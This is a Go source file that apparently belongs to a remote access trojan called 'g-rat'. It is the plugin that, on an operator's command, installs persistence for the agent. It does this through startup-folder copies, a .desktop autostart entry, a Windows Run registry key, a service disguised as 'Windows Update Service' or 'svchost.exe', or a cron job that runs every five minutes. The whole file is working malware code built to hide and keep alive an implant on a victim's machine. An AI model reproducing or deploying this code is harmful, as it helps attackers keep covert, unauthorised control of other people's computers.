package plugins

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"

	"github.com/sevil11/g-rat/shared"
)

// HandlePersistence implements persistence mechanisms
func HandlePersistence(task shared.Task) shared.Result {
	result := shared.Result{
		TaskID:    task.ID,
		AgentID:   "", // Will be set by the agent
		StartTime: time.Now(),
	}
	
	// Determine persistence method
	method := task.Command
	fileName, _ := task.Args["file_name"]
	
	if fileName == "" {
		// Use default name if not specified
		if runtime.GOOS == "windows" {
			fileName = "svchost.exe"
		} else {
			fileName = "systemd"
		}
	}
	
	var err error
	switch method {
	case "startup":
		err = installStartup(fileName)
	case "registry":
		err = installRegistry(fileName)
	case "service":
		err = installService(fileName)
	case "cron":
		err = installCron(fileName)
	default:
		err = fmt.Errorf("unknown persistence method: %s", method)
	}
	
	if err != nil {
		result.Error = err.Error()
		result.ExitCode = 1
	} else {
		result.Output = fmt.Sprintf("Persistence installed using %s method", method)
	}
	
	return result
}

// installStartup adds the agent to the startup folder
func installStartup(fileName string) error {
	// Get current executable path
	ex, err := os.Executable()
	if err != nil {
		return err
	}
	
	// Determine startup folder
	var startupDir string
	if runtime.GOOS == "windows" {
		startupDir = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	} else {
		homeDir, err := os.UserHomeDir()
		if err != nil {
			return err
		}
		startupDir = filepath.Join(homeDir, ".config", "autostart")
		if _, err := os.Stat(startupDir); os.IsNotExist(err) {
			os.MkdirAll(startupDir, 0755)
		}
	}
	
	// Create startup file path
	startupPath := filepath.Join(startupDir, fileName)
	
	// Windows: Copy executable, Linux: Create .desktop file
	if runtime.GOOS == "windows" {
		return copyFile(ex, startupPath)
	} else {
		// Create .desktop file
		desktopFile := fmt.Sprintf(
			"[Desktop Entry]\nType=Application\nName=System Service\nExec=%s\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true",
			ex,
		)
		return os.WriteFile(startupPath+".desktop", []byte(desktopFile), 0755)
	}
}

// installRegistry adds the agent to the Windows registry
func installRegistry(fileName string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("registry persistence only supported on Windows")
	}
	
	ex, err := os.Executable()
	if err != nil {
		return err
	}
	
	// Use PowerShell to add registry key
	cmd := exec.Command(
		"powershell",
		"-Command",
		fmt.Sprintf(
			"New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '%s' -Value '%s' -PropertyType String -Force",
			fileName, ex,
		),
	)
	
	return cmd.Run()
}

// installService adds the agent as a system service
func installService(fileName string) error {
	ex, err := os.Executable()
	if err != nil {
		return err
	}
	
	if runtime.GOOS == "windows" {
		// Windows service installation (requires admin privileges)
		cmd := exec.Command(
			"sc",
			"create",
			fileName,
			"binPath="+ex,
			"start=auto",
			"DisplayName=Windows Update Service",
		)
		return cmd.Run()
	} else {
		// Linux systemd service
		serviceContent := fmt.Sprintf(
			"[Unit]\nDescription=System Update Service\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\n\n[Install]\nWantedBy=multi-user.target",
			ex,
		)
		
		servicePath := fmt.Sprintf("/etc/systemd/system/%s.service", fileName)
		
		if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
			return err
		}
		
		// Enable and start service
		cmd := exec.Command("systemctl", "enable", fileName+".service")
		if err := cmd.Run(); err != nil {
			return err
		}
		
		cmd = exec.Command("systemctl", "start", fileName+".service")
		return cmd.Run()
	}
}

// installCron adds the agent to cron jobs (Linux/macOS)
func installCron(fileName string) error {
	if runtime.GOOS == "windows" {
		return fmt.Errorf("cron persistence only supported on Linux/macOS")
	}
	
	ex, err := os.Executable()
	if err != nil {
		return err
	}
	
	// Add cron job to run every 5 minutes
	cronJob := fmt.Sprintf("*/5 * * * * %s\n", ex)
	
	// Temporary file for new crontab
	tmpFile := filepath.Join(os.TempDir(), "crontab.tmp")
	
	// Export existing crontab
	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()
	
	// Append our job and write to temp file
	f, err := os.Create(tmpFile)
	if err != nil {
		return err
	}
	defer os.Remove(tmpFile)
	
	f.Write(output)
	f.WriteString(cronJob)
	f.Close()
	
	// Import modified crontab
	cmd = exec.Command("crontab", tmpFile)
	return cmd.Run()
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()
	
	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()
	
	_, err = io.Copy(destFile, sourceFile)
	return err
}